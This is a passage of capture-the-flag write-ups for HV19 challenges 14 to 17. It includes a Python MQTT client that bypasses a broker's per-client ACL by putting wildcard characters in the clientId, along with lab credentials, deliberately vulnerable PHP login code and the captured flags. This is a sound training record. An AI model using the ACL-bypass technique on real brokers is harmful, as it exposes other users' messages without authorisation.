+<span id="cb23-11"><a href="#cb23-11"></a> createText($PMMtQJOcHm8eFQfdsdNAS20-&gt;()%600+20,$PMMtQJOcHm8eFQfdsdNAS20-&gt;()%440+20,#Perl!!</span>
+<span id="cb23-12"><a href="#cb23-12"></a><span class="st">-&quot;-text&quot;=&gt;$d28Vt03MEbdY0-&gt;(),&quot;-$y&quot;=&gt;$z);})-&gt;();$HACK;$i=$vMnyQdAkfgIIik-&gt;repeat(25,sub{$_=(</span></span>
+<span id="cb23-13"><a href="#cb23-13"></a><span class="va">+&quot;-text&quot;=&gt;sub{$blop=$d28Vt03MEbdY0-&gt;(); print &quot;${blop}&quot;; $blop}-&gt;(),&quot;-$y&quot;=&gt;$z);})-&gt;();$HACK;$i=$vMnyQdAkfgIIik-&gt;repeat(50,sub{$_=(</span></span>
+<span id="cb23-14"><a href="#cb23-14"></a> $_8NZQooI5K4b+=0.1*$Sk6lA7p0);;$p[0]+=3.0*cos;$p[1]-=3*sin;;($p[0]&gt;1&amp;&amp;$p[1]&gt;1&amp;&amp;$p[0]&lt;639&amp;&amp;</span>
+<span id="cb23-15"><a href="#cb23-15"></a> $p[1]&lt;479)||$i-&gt;cancel();00;$q=($vMnyQdAkfgIIik-&gt;find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,</span>
+<span id="cb23-16"><a href="#cb23-16"></a><span class="st">-$p[0]+1,$p[1]+1)||[])-&gt;[0];$q==$t&amp;&amp;$T-&gt;();$vMnyQdAkfgIIik-&gt;insert($cqI,&#39;end&#39;,\@p);($q==###</span></span>
+<span id="cb23-17"><a href="#cb23-17"></a><span class="va">+$p[0]+1,$p[1]+1)||[])-&gt;[0];sub{$bla=$bla+1;$q=$bla;}-&gt;();$q==$t&amp;&amp;$T-&gt;();$vMnyQdAkfgIIik-&gt;insert($cqI,&#39;end&#39;,\@p);($q==###</span></span>
+<span id="cb23-18"><a href="#cb23-18"></a> $cqI||$S9cXJIGB0BWce&gt;44)&amp;&amp;$i-&gt;cancel();});$KE=5;$vgOjwRk4wIo7_-&gt;bind(&quot;&lt;$Sk61A7pO-n&gt;&quot;=&gt;sub{</span>
+<span id="cb23-19"><a href="#cb23-19"></a> $Sk6lA7p0=1;});$vgOjwRk4wIo7_-&gt;bind(&quot;&lt;$Sk61A7pO-m&gt;&quot;=&gt;sub{$Sk6lA7p0=-1;});$vgOjwRk4wIo7_#%&quot;</span>
+<span id="cb23-20"><a href="#cb23-20"></a> -&gt;bind(&quot;&lt;$sk6i47pO-n&gt;&quot;=&gt;sub{$Sk6lA7p0=0 if$Sk6lA7p0&gt;0;});$vgOjwRk4wIo7_-&gt;bind(&quot;&lt;$sk6i47pO&quot;</span></code></pre></div>
+<p>Three things are done here:</p>
+<ul>
+<li>Line 9: add a counter variable <code>$bla</code> that will be used to override the value of <code>$q</code>.</li>
+<li>Line 16: override <code>$q</code> with the value of <code>$bla</code> by introducing a subroutine which is called immediately.</li>
+<li>Line 13: print out to console the characters written to the canvas (via a subroutine again).</li>
+</ul>
+<h2 id="flag-13">Flag</h2>
+<pre><code>HV19{s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&amp;&amp;s[(.)(..)][\2\1]g;s%4(...)%&quot;p$1t&quot;%ee}
+</code></pre>
+<h1 id="hv1915---santas-workshop">HV19.15 - Santa's Workshop</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>inik &amp; avarx</td>
+<td>hard</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-14">Given</h2>
+<p>The Elves are working very hard. Look at <a href="http://whale.hacking-lab.com:2080/">http://whale.hacking-lab.com:2080/</a> to see how busy they are.</p>
+<p>config.js:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb25-1"><a href="#cb25-1"></a><span class="kw">var</span> mqtt<span class="op">;</span></span>
+<span id="cb25-2"><a href="#cb25-2"></a><span class="kw">var</span> reconnectTimeout <span class="op">=</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb25-3"><a href="#cb25-3"></a><span class="kw">var</span> host <span class="op">=</span> <span class="st">&#39;whale.hacking-lab.com&#39;</span><span class="op">;</span></span>
+<span id="cb25-4"><a href="#cb25-4"></a><span class="kw">var</span> port <span class="op">=</span> <span class="dv">9001</span><span class="op">;</span></span>
+<span id="cb25-5"><a href="#cb25-5"></a><span class="kw">var</span> useTLS <span class="op">=</span> <span class="kw">false</span><span class="op">;</span></span>
+<span id="cb25-6"><a href="#cb25-6"></a><span class="kw">var</span> username <span class="op">=</span> <span class="st">&#39;workshop&#39;</span><span class="op">;</span></span>
+<span id="cb25-7"><a href="#cb25-7"></a><span class="kw">var</span> password <span class="op">=</span> <span class="st">&#39;2fXc7AWINBXyruvKLiX&#39;</span><span class="op">;</span></span>
+<span id="cb25-8"><a href="#cb25-8"></a><span class="kw">var</span> clientid <span class="op">=</span> <span class="va">localStorage</span>.<span class="at">getItem</span>(<span class="st">&quot;clientid&quot;</span>)<span class="op">;</span></span>
+<span id="cb25-9"><a href="#cb25-9"></a><span class="cf">if</span> (clientid <span class="op">==</span> <span class="kw">null</span>) <span class="op">{</span></span>
+<span id="cb25-10"><a href="#cb25-10"></a>  clientid <span class="op">=</span> (<span class="st">&#39;&#39;</span> <span class="op">+</span> (<span class="va">Math</span>.<span class="at">round</span>(<span class="va">Math</span>.<span class="at">random</span>() <span class="op">*</span> <span class="dv">1000000000000000</span>))).<span class="at">padStart</span>(<span class="dv">16</span><span class="op">,</span> <span class="st">&#39;0&#39;</span>)<span class="op">;</span></span>
+<span id="cb25-11"><a href="#cb25-11"></a>  <span class="va">localStorage</span>.<span class="at">setItem</span>(<span class="st">&quot;clientid&quot;</span><span class="op">,</span> clientid)<span class="op">;</span></span>
+<span id="cb25-12"><a href="#cb25-12"></a><span class="op">}</span></span>
+<span id="cb25-13"><a href="#cb25-13"></a><span class="kw">var</span> topic <span class="op">=</span> <span class="st">&#39;HV19/gifts/&#39;</span><span class="op">+</span>clientid<span class="op">;</span></span>
+<span id="cb25-14"><a href="#cb25-14"></a><span class="co">// var topic = &#39;HV19/gifts/&#39;+clientid+&#39;/flag-tbd&#39;;</span></span>
+<span id="cb25-15"><a href="#cb25-15"></a><span class="kw">var</span> cleansession <span class="op">=</span> <span class="kw">true</span><span class="op">;</span></span></code></pre></div>
+<p>mqtt.js:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb26-1"><a href="#cb26-1"></a><span class="co">// ...</span></span>
+<span id="cb26-2"><a href="#cb26-2"></a>mqtt <span class="op">=</span> <span class="kw">new</span> <span class="va">Paho</span>.<span class="va">MQTT</span>.<span class="at">Client</span>(</span>
+<span id="cb26-3"><a href="#cb26-3"></a>                host<span class="op">,</span></span>
+<span id="cb26-4"><a href="#cb26-4"></a>                port<span class="op">,</span></span>
+<span id="cb26-5"><a href="#cb26-5"></a>                path<span class="op">,</span></span>
+<span id="cb26-6"><a href="#cb26-6"></a>                clientid</span>
+<span id="cb26-7"><a href="#cb26-7"></a>)<span class="op">;</span></span>
+<span id="cb26-8"><a href="#cb26-8"></a><span class="co">// ...</span></span>
+<span id="cb26-9"><a href="#cb26-9"></a></span>
+<span id="cb26-10"><a href="#cb26-10"></a><span class="kw">function</span> <span class="at">onConnect</span>() <span class="op">{</span></span>
+<span id="cb26-11"><a href="#cb26-11"></a>    <span class="va">mqtt</span>.<span class="at">subscribe</span>(topic<span class="op">,</span> <span class="op">{</span><span class="dt">qos</span><span class="op">:</span> <span class="dv">0</span><span class="op">}</span>)<span class="op">;</span></span>
+<span id="cb26-12"><a href="#cb26-12"></a><span class="op">}</span></span>
+<span id="cb26-13"><a href="#cb26-13"></a><span class="co">//...</span></span></code></pre></div>
+<p>The webapp on <a href="http://whale.hacking-lab.com:2080/">http://whale.hacking-lab.com:2080/</a> generated a random, 16-digit clientId to connect to the MQTT broker at ws://whale.hacking-lab.com:9001. In my case, this was 123888932589762459</p>
+<h3 id="hints-3">Hints</h3>
+<p>Due to stability problems, time is extended for +24h</p>
+<ol>
+<li>When you have the webpage open and the counter is running (for your clientid), the challenge works for you</li>
+<li>Due to server instability there are websockets hangups. Reload of webpage (or restart of your script) will help and lead to 1)</li>
+<li>There are possibilities to crash the server with dedicated client-ids, eg. very long client-ids. For this, the length of client is now limited to 30. For longer client-ids no count nor flag is published</li>
+</ol>
+<h2 id="approach-12">Approach</h2>
+<p>I wrote a python client using <a href="https://pypi.org/project/paho-mqtt/">https://pypi.org/project/paho-mqtt/</a> (also <a href="https://www.eclipse.org/paho/clients/python/">https://www.eclipse.org/paho/clients/python/</a> and <a href="https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html">https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html</a>) to be able to play around in a bit more flexible fashion.</p>
+<p>In the beginning, I had some trouble connecting to the broker, which was half due to the broker being down, half due to me, not changing the client's connection mode from <code>tcp</code> to <code>websocket</code>.</p>
+<p>I started by using the clientId that was intended by the webapp (<code>123888932589762459</code>).</p>
+<p>Trying to subscribe to the <code>"$SYS/#"</code> topic (see <a href="https://github.com/mqtt/mqtt.github.io/wiki/SYS-Topics">https://github.com/mqtt/mqtt.github.io/wiki/SYS-Topics</a>), the following message was received:</p>
+<pre><code>$SYS/broker/versionmosquitto version 1.4.11 (We elves are super-smart and know about CVE-2017-7650 and the POC. So we made a genious fix you never will be able to pass. Hohoho)
+</code></pre>
+<p>So, I need to be smarter than this. Also, looking at <code>config.js</code>, there is a comment indicating that the flag could be the name of a sub-topic underneath my clientId's topic. Let's keep this in mind.</p>
+<p>Checking the CVE (see <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7650">https://nvd.nist.gov/vuln/detail/CVE-2017-7650</a>) and its fix (see <a href="https://bugs.eclipse.org/bugs/attachment.cgi?id=268603&amp;action=diff">https://bugs.eclipse.org/bugs/attachment.cgi?id=268603&amp;action=diff</a>), one could see that any clientId containing one of <code>[+#/]</code> (with <code>+</code> and <code>#</code> being MQTT wildcard operators, see <a href="https://www.ibm.com/support/knowledgecenter/en/SSFKSJ_7.5.0/com.ibm.mq.pla.doc/q005010_.htm">https://www.ibm.com/support/knowledgecenter/en/SSFKSJ_7.5.0/com.ibm.mq.pla.doc/q005010_.htm</a>) was not supposed to work. Let's check how the elves fixed that bug...</p>
+<p>Setting the clientId to <code>#</code> indeed prevented from connecting to the broker. However, setting it to <code>abc/#</code> connects just fine.</p>
+<p>After a couple of attempts, I got the following working solution.</p>
+<h3 id="solution">Solution</h3>
+<p>Connect with:</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb28-1"><a href="#cb28-1"></a>clientid<span class="op">=</span><span class="st">&quot;123888932589762459/#&quot;</span>  <span class="co"># or &quot;123888932589762459/+&quot;</span></span>
+<span id="cb28-2"><a href="#cb28-2"></a>topic<span class="op">=</span><span class="st">&quot;HV19/gifts/123888932589762459/#&quot;</span>  <span class="co"># or topic=&quot;HV19/gifts/123888932589762459/+&quot;</span></span></code></pre></div>
+<p>Remember that the topic we want is located underneath the <code>HV19/gifts/123888932589762459</code> topic? Let's go for that.</p>
+<p>This produces the following output:</p>
+<pre><code>log:  Received PUBLISH (d0, q0, r0, m0), &#39;HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}&#39;, ...  (70 bytes)
+2019-12-15 12:03:08.305653: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b&#39;Congrats, you got it. The elves should not overrate their smartness!!!&#39; 0 0 - (0, 0)
+log:  Received PUBLISH (d0, q0, r0, m0), &#39;HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}&#39;, ...  (70 bytes)
+2019-12-15 12:03:08.306256: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b&#39;Congrats, you got it. The elves should not overrate their smartness!!!&#39; 0 0 - (0, 0)
+log:  Received PUBLISH (d0, q0, r0, m0), &#39;HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}&#39;, ...  (70 bytes)
+2019-12-15 12:03:08.306764: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b&#39;Congrats, you got it. The elves should not overrate their smartness!!!&#39; 0 0 - (0, 0)
+log:  Received PUBLISH (d0, q0, r0, m0), &#39;HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}&#39;, ...  (70 bytes)
+2019-12-15 12:03:08.404884: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b&#39;Congrats, you got it. The elves should not overrate their smartness!!!&#39; 0 0 - (0, 0)
+</code></pre>
+<p>Why does the clientId need to include the wildcard operator? This is because how the ACL is defined. Mosquitto lets you define an ACL in the form of <code>pattern read HV19/gifts/%c</code> which allows each client to read only from topics matching the indicated prefix followed by their clientId.</p>
+<p>Here's my very simple python client:</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb30-1"><a href="#cb30-1"></a><span class="im">import</span> paho.mqtt.client <span class="im">as</span> mqtt</span>
+<span id="cb30-2"><a href="#cb30-2"></a><span class="im">import</span> datetime</span>
+<span id="cb30-3"><a href="#cb30-3"></a></span>
+<span id="cb30-4"><a href="#cb30-4"></a><span class="co"># The callback for when the client receives a CONNACK response from the server.</span></span>
+<span id="cb30-5"><a href="#cb30-5"></a><span class="kw">def</span> on_connect(client, userdata, flags, rc):</span>
+<span id="cb30-6"><a href="#cb30-6"></a>    <span class="bu">print</span>(<span class="st">&quot;Connected with result code &quot;</span><span class="op">+</span><span class="bu">str</span>(rc))</span>
+<span id="cb30-7"><a href="#cb30-7"></a>    client.subscribe(topic)</span>
+<span id="cb30-8"><a href="#cb30-8"></a>    client.subscribe(topic<span class="op">+</span><span class="st">&quot;/#&quot;</span>)</span>
+<span id="cb30-9"><a href="#cb30-9"></a></span>
+<span id="cb30-10"><a href="#cb30-10"></a><span class="kw">def</span> on_subscribe(client, userdata, mid, granted_qos, <span class="op">*</span>args, <span class="op">**</span>kwargs):</span>
+<span id="cb30-11"><a href="#cb30-11"></a>    <span class="bu">print</span>(<span class="bu">str</span>(mid))</span>
+<span id="cb30-12"><a href="#cb30-12"></a></span>
+<span id="cb30-13"><a href="#cb30-13"></a><span class="kw">def</span> on_log(client, userdata, level, buf):</span>
+<span id="cb30-14"><a href="#cb30-14"></a>    <span class="bu">print</span>(<span class="st">&quot;log: &quot;</span>,buf)</span>
+<span id="cb30-15"><a href="#cb30-15"></a></span>
+<span id="cb30-16"><a href="#cb30-16"></a><span class="co"># The callback for when a PUBLISH message is received from the server.</span></span>
+<span id="cb30-17"><a href="#cb30-17"></a><span class="kw">def</span> on_message(client, userdata, msg):</span>
+<span id="cb30-18"><a href="#cb30-18"></a>    timestamp<span class="op">=</span><span class="bu">str</span>(datetime.datetime.now())</span>
+<span id="cb30-19"><a href="#cb30-19"></a>    <span class="bu">print</span>(timestamp <span class="op">+</span> <span class="st">&quot;: &quot;</span> <span class="op">+</span> msg.topic<span class="op">+</span><span class="st">&quot; (&quot;</span><span class="op">+</span><span class="bu">str</span>(msg.mid)<span class="op">+</span><span class="st">&quot;) &quot;</span><span class="op">+</span><span class="bu">str</span>(msg.payload)<span class="op">+</span><span class="st">&quot; &quot;</span><span class="op">+</span><span class="bu">str</span>(msg.dup)<span class="op">+</span><span class="st">&quot; &quot;</span><span class="op">+</span><span class="bu">str</span>(msg.qos)<span class="op">+</span><span class="st">&quot; - &quot;</span><span class="op">+</span><span class="bu">str</span>(msg.info))</span>
+<span id="cb30-20"><a href="#cb30-20"></a></span>
+<span id="cb30-21"><a href="#cb30-21"></a></span>
+<span id="cb30-22"><a href="#cb30-22"></a>clientid<span class="op">=</span><span class="st">&quot;123888932589762459/#&quot;</span></span>
+<span id="cb30-23"><a href="#cb30-23"></a></span>
+<span id="cb30-24"><a href="#cb30-24"></a>topic<span class="op">=</span><span class="st">&quot;HV19/gifts/123888932589762459&quot;</span></span>
+<span id="cb30-25"><a href="#cb30-25"></a></span>
+<span id="cb30-26"><a href="#cb30-26"></a>client <span class="op">=</span> mqtt.Client(client_id<span class="op">=</span>clientid, clean_session<span class="op">=</span><span class="va">True</span>, transport<span class="op">=</span><span class="st">&#39;websockets&#39;</span>)</span>
+<span id="cb30-27"><a href="#cb30-27"></a>client.on_connect <span class="op">=</span> on_connect</span>
+<span id="cb30-28"><a href="#cb30-28"></a>client.on_subscribe <span class="op">=</span> on_subscribe</span>
+<span id="cb30-29"><a href="#cb30-29"></a>client.on_message <span class="op">=</span> on_message</span>
+<span id="cb30-30"><a href="#cb30-30"></a>client.on_log <span class="op">=</span> on_log</span>
+<span id="cb30-31"><a href="#cb30-31"></a></span>
+<span id="cb30-32"><a href="#cb30-32"></a>client.username_pw_set(<span class="st">&#39;workshop&#39;</span>, <span class="st">&#39;2fXc7AWINBXyruvKLiX&#39;</span>)</span>
+<span id="cb30-33"><a href="#cb30-33"></a>client.<span class="ex">connect</span>(<span class="st">&quot;whale.hacking-lab.com&quot;</span>, <span class="dv">9001</span>, <span class="dv">60</span>)</span>
+<span id="cb30-34"><a href="#cb30-34"></a></span>
+<span id="cb30-35"><a href="#cb30-35"></a><span class="bu">print</span>(<span class="st">&quot;Looping&quot;</span>)</span>
+<span id="cb30-36"><a href="#cb30-36"></a>client.loop_forever()</span></code></pre></div>
+<h3 id="a-simpler-approach">A simpler approach</h3>
+<p>Probably the simplest approach would have been to go to the webapp's local storage in the browser and edit the clientId value by appending <code>/#</code> to the existing 16-digit value.</p>
+<p>In the browser's network analysis tab, messages like the following can then be appreciated:</p>
+<pre><code>00000000: 308f 0100 4748 5631 392f 6769 6674 732f  0...GHV19/gifts/
+00000001: 3132 3338 3838 3933 3235 3839 3736 3234  1238889325897624
+00000002: 3539 2f48 5631 397b 4e30 5f31 6e70 7574  59/HV19{N0_1nput
+00000003: 5f76 346c 3164 3474 3130 6e5f 3371 7534  _v4l1d4t10n_3qu4
+00000004: 6c73 5f64 3173 3473 7433 727d 436f 6e67  ls_d1s4st3r}Cong
+00000005: 7261 7473 2c20 796f 7520 676f 7420 6974  rats, you got it
+00000006: 2e20 5468 6520 656c 7665 7320 7368 6f75  . The elves shou
+00000007: 6c64 206e 6f74 206f 7665 7272 6174 6520  ld not overrate 
+00000008: 7468 6569 7220 736d 6172 746e 6573 7321  their smartness!
+00000009: 2121                                     !!
+</code></pre>
+<h2 id="flag-14">Flag</h2>
+<pre><code>HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}
+</code></pre>
+<h1 id="hv1916---b0rked-calculator">HV19.16 - B0rked Calculator</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>hardlock</td>
+<td>hard</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-15">Given</h2>
+<p>Santa has coded a simple project for you, but sadly he removed all the operations. But when you restore them it will print the flag!</p>
+<p><a href="9b90c573-d530-401b-b3f8-24454bbf015e.zip">HV19.16-b0rked.zip</a></p>
+<h2 id="approach-13">Approach</h2>
+<p>First, I started skimming through the binary with Ghidra, only to find these NOP sleds somewhere after address 0x00401000.</p>
+<p>I quickly thought that patching the binary was probably easier than analysing it in a static way or even calculating the functions while running a debugger.</p>
+<p>So, I spent some time)to find out how to patch a Windows PE binary file - never done that so far. OllyDbg was the candidate of choice.</p>
+<p>OllyDbg allows one to write assembly code which is assembled on the fly.</p>
+<p>I added the 4 functions in assembly code and "B0rked Calc" produced the flag.</p>
+<p>See the screenshot for details:</p>
+<p><img src="./HV19.16_B0rked_calc_corrected.png" alt="Screenshot here" /></p>
+<h2 id="flag-15">Flag</h2>
+<pre><code>HV19{B0rked_Flag_Calculat0r}
+</code></pre>
+<h2 id="other-notes">Other notes</h2>
+<p>Software to edit other software (binary patching):</p>
+<ul>
+<li>Binary patching bsdiff &amp; bspatch</li>
+<li>Hopper</li>
+<li>Manipulate PE file with Python: <a href="https://axcheron.github.io/pe-format-manipulation-with-pefile/">https://axcheron.github.io/pe-format-manipulation-with-pefile/</a></li>
+</ul>
+<h1 id="hv1917---unicode-portal">HV19.17 - Unicode Portal</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>scryh</td>
+<td>hard</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-16">Given</h2>
+<p>Buy your special gifts online, but for the ultimative gift you have to become admin.</p>
+<p><a href="http://whale.hacking-lab.com:8881/">http://whale.hacking-lab.com:8881/</a></p>
+<h3 id="source">Source</h3>
+<p>After registering with the given portal, one had access to the source code of the page:</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb34-1"><a href="#cb34-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb34-2"><a href="#cb34-2"></a></span>
+<span id="cb34-3"><a href="#cb34-3"></a><span class="kw">if</span> <span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;show&#39;</span><span class="ot">]))</span> <span class="fu">highlight_file</span><span class="ot">(</span><span class="kw">__FILE__</span><span class="ot">);</span></span>
+<span id="cb34-4"><a href="#cb34-4"></a></span>
+<span id="cb34-5"><a href="#cb34-5"></a><span class="co">/**</span></span>
+<span id="cb34-6"><a href="#cb34-6"></a><span class="co"> * Verifies user credentials.</span></span>
+<span id="cb34-7"><a href="#cb34-7"></a><span class="co"> */</span></span>
+<span id="cb34-8"><a href="#cb34-8"></a><span class="kw">function</span> verifyCreds<span class="ot">(</span><span class="kw">$conn</span><span class="ot">,</span> <span class="kw">$username</span><span class="ot">,</span> <span class="kw">$password</span><span class="ot">)</span> {</span>
+<span id="cb34-9"><a href="#cb34-9"></a>  <span class="kw">$usr</span> = <span class="kw">$conn</span>-&gt;real_escape_string<span class="ot">(</span><span class="kw">$username</span><span class="ot">);</span></span>
+<span id="cb34-10"><a href="#cb34-10"></a>  <span class="kw">$res</span> = <span class="kw">$conn</span>-&gt;query<span class="ot">(</span><span class="st">&quot;SELECT password FROM users WHERE username=&#39;&quot;</span>.<span class="kw">$usr</span>.<span class="st">&quot;&#39;&quot;</span><span class="ot">);</span></span>
+<span id="cb34-11"><a href="#cb34-11"></a>  <span class="kw">$row</span> = <span class="kw">$res</span>-&gt;fetch_assoc<span class="ot">();</span></span>
+<span id="cb34-12"><a href="#cb34-12"></a>  <span class="kw">if</span> <span class="ot">(</span><span class="kw">$row</span><span class="ot">)</span> {</span>
+<span id="cb34-13"><a href="#cb34-13"></a>    <span class="kw">if</span> <span class="ot">(</span><span class="fu">password_verify</span><span class="ot">(</span><span class="kw">$password</span><span class="ot">,</span> <span class="kw">$row</span><span class="ot">[</span><span class="st">&#39;password&#39;</span><span class="ot">]))</span> <span class="kw">return</span> <span class="kw">true</span><span class="ot">;</span></span>
+<span id="cb34-14"><a href="#cb34-14"></a>    <span class="kw">else</span> addFailedLoginAttempt<span class="ot">(</span><span class="kw">$conn</span><span class="ot">,</span> <span class="kw">$_SERVER</span><span class="ot">[</span><span class="st">&#39;REMOTE_ADDR&#39;</span><span class="ot">]);</span></span>
+<span id="cb34-15"><a href="#cb34-15"></a>  }</span>
+<span id="cb34-16"><a href="#cb34-16"></a>  <span class="kw">return</span> <span class="kw">false</span><span class="ot">;</span></span>
+<span id="cb34-17"><a href="#cb34-17"></a>}</span>
+<span id="cb34-18"><a href="#cb34-18"></a></span>
+<span id="cb34-19"><a href="#cb34-19"></a><span class="co">/**</span></span>
+<span id="cb34-20"><a href="#cb34-20"></a><span class="co"> * Determines if the given user is admin.</span></span>
+<span id="cb34-21"><a href="#cb34-21"></a><span class="co"> */</span></span>
+<span id="cb34-22"><a href="#cb34-22"></a><span class="kw">function</span> isAdmin<span class="ot">(</span><span class="kw">$username</span><span class="ot">)</span> {</span>
+<span id="cb34-23"><a href="#cb34-23"></a>  <span class="kw">return</span> <span class="ot">(</span><span class="kw">$username</span> === <span class="st">&#39;santa&#39;</span><span class="ot">);</span></span>
+<span id="cb34-24"><a href="#cb34-24"></a>}</span>
+<span id="cb34-25"><a href="#cb34-25"></a></span>
+<span id="cb34-26"><a href="#cb34-26"></a><span class="co">/**</span></span>
+<span id="cb34-27"><a href="#cb34-27"></a><span class="co"> * Determines if the given username is already taken.</span></span>
+<span id="cb34-28"><a href="#cb34-28"></a><span class="co"> */</span></span>
+<span id="cb34-29"><a href="#cb34-29"></a><span class="kw">function</span> isUsernameAvailable<span class="ot">(</span><span class="kw">$conn</span><span class="ot">,</span> <span class="kw">$username</span><span class="ot">)</span> {</span>
+<span id="cb34-30"><a href="#cb34-30"></a>  <span class="kw">$usr</span> = <span class="kw">$conn</span>-&gt;real_escape_string<span class="ot">(</span><span class="kw">$username</span><span class="ot">);</span></span>
+<span id="cb34-31"><a href="#cb34-31"></a>  <span class="kw">$res</span> = <span class="kw">$conn</span>-&gt;query<span class="ot">(</span><span class="st">&quot;SELECT COUNT(*) AS cnt FROM users WHERE LOWER(username) = BINARY LOWER(&#39;&quot;</span>.<span class="kw">$usr</span>.<span class="st">&quot;&#39;)&quot;</span><span class="ot">);</span></span>
+<span id="cb34-32"><a href="#cb34-32"></a>  <span class="kw">$row</span> = <span class="kw">$res</span>-&gt;fetch_assoc<span class="ot">();</span></span>
+<span id="cb34-33"><a href="#cb34-33"></a>  <span class="kw">return</span> <span class="dt">(int)</span><span class="kw">$row</span><span class="ot">[</span><span class="st">&#39;cnt&#39;</span><span class="ot">]</span> === <span class="dv">0</span><span class="ot">;</span></span>
+<span id="cb34-34"><a href="#cb34-34"></a>}</span>
+<span id="cb34-35"><a href="#cb34-35"></a></span>
+<span id="cb34-36"><a href="#cb34-36"></a><span class="co">/**</span></span>
+<span id="cb34-37"><a href="#cb34-37"></a><span class="co"> * Registers a new user.</span></span>
+<span id="cb34-38"><a href="#cb34-38"></a><span class="co"> */</span></span>
+<span id="cb34-39"><a href="#cb34-39"></a><span class="kw">function</span> registerUser<span class="ot">(</span><span class="kw">$conn</span><span class="ot">,</span> <span class="kw">$username</span><span class="ot">,</span> <span class="kw">$password</span><span class="ot">)</span> {</span>
+<span id="cb34-40"><a href="#cb34-40"></a>  <span class="kw">$usr</span> = <span class="kw">$conn</span>-&gt;real_escape_string<span class="ot">(</span><span class="kw">$username</span><span class="ot">);</span></span>
+<span id="cb34-41"><a href="#cb34-41"></a>  <span class="kw">$pwd</span> = <span class="fu">password_hash</span><span class="ot">(</span><span class="kw">$password</span><span class="ot">,</span> <span class="kw">PASSWORD_DEFAULT</span><span class="ot">);</span></span>
+<span id="cb34-42"><a href="#cb34-42"></a>  <span class="kw">$conn</span>-&gt;query<span class="ot">(</span><span class="st">&quot;INSERT INTO users (username, password) VALUES (UPPER(&#39;&quot;</span>.<span class="kw">$usr</span>.<span class="st">&quot;&#39;),&#39;&quot;</span>.<span class="kw">$pwd</span>.<span class="st">&quot;&#39;) ON DUPLICATE KEY UPDATE password=&#39;&quot;</span>.<span class="kw">$pwd</span>.<span class="st">&quot;&#39;&quot;</span><span class="ot">);</span></span>
+<span id="cb34-43"><a href="#cb34-43"></a>}</span>
+<span id="cb34-44"><a href="#cb34-44"></a></span>
+<span id="cb34-45"><a href="#cb34-45"></a><span class="co">/**</span></span>
+<span id="cb34-46"><a href="#cb34-46"></a><span class="co"> * Adds a failed login attempt for the given ip address. An ip address gets blacklisted for 15 minutes if there are more than 3 failed login attempts.</span></span>
+<span id="cb34-47"><a href="#cb34-47"></a><span class="co"> */</span></span>
+<span id="cb34-48"><a href="#cb34-48"></a><span class="kw">function</span> addFailedLoginAttempt<span class="ot">(</span><span class="kw">$conn</span><span class="ot">,</span> <span class="kw">$ip</span><span class="ot">)</span> {</span>
+<span id="cb34-49"><a href="#cb34-49"></a>  <span class="kw">$ip</span> = <span class="kw">$conn</span>-&gt;real_escape_string<span class="ot">(</span><span class="kw">$ip</span><span class="ot">);</span></span>
+<span id="cb34-50"><a href="#cb34-50"></a>  <span class="kw">$conn</span>-&gt;query<span class="ot">(</span><span class="st">&quot;INSERT INTO fails (ip) VALUES (&#39;&quot;</span>.<span class="kw">$ip</span>.<span class="st">&quot;&#39;)&quot;</span><span class="ot">);</span></span>
+<span id="cb34-51"><a href="#cb34-51"></a>}</span>
+<span id="cb34-52"><a href="#cb34-52"></a></span>
+<span id="cb34-53"><a href="#cb34-53"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<h2 id="approach-14">Approach</h2>
+<p>From the given source code it was clear that we had to become "santa" (which is re-named "admin"). My first focus was on the <code>real_escape_string</code> function, but despite being not very restrictive, it didn't leverage an SQL injection.</p>
+<p>Second, I noticed these strange upper-/lowercase transformations, which seemed odd. Let's try to go after them. The challenge's name was about "unicode", so let's have a loo kat the intrsection of SQLi and Unicode.</p>
